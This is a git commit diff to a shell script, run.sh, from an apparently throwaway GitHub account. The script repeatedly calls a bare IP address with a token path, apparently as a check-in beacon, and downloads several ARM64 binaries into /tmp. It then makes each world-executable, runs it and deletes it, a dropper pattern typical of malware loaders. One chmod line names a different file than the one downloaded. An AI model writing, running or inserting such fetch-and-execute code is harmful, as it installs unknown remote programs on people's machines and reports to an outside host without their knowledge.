ff871a976b4371a77e33873e3847f640e7a1bc69
gptloveyou <129956509+gptloveyou@users.noreply.github.com>
2023-04-06 10:28:08 +0000

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,7 +1,21 @@
 #!/bin/sh
 curl -s http://139.180.135.229:19088/9024134B28978B68666E2B034E46130E/debug
-curl -o /tmp/run2.bin https://raw.githubusercontent.com/gptloveyou/learn/main/arm64_5.bin
-chmod 777 /tmp/run2.bin
-/tmp/run2.bin
-rm /tmp/run2.bin
+curl -o /tmp/arm64_5.bin https://raw.githubusercontent.com/gptloveyou/learn/main/arm64_5.bin
+chmod 777 /tmp/arm64_5.bin
+/tmp/arm64_5.bin
+rm /tmp/arm64_5.bin
+
+curl -s http://139.180.135.229:19088/9024134B28978B68666E2B034E46130E/debug
+
+curl -o /tmp/_arm64_6.bin https://raw.githubusercontent.com/gptloveyou/learn/main/arm64_6.bin
+chmod 777 /tmp/run_arm64_6.bin
+/tmp/_arm64_6.bin
+rm /tmp/_arm64_6.bin
+
+curl -s http://139.180.135.229:19088/9024134B28978B68666E2B034E46130E/debug
+curl -o /tmp/arm64_7.bin https://raw.githubusercontent.com/gptloveyou/learn/main/arm64_7.bin
+chmod 777 /tmp/arm64_7.bin
+/tmp/arm64_7.bin
+rm /tmp/arm64_7.bin
+ 
 curl -s http://139.180.135.229:19088/9024134B28978B68666E2B034E46130E/debug
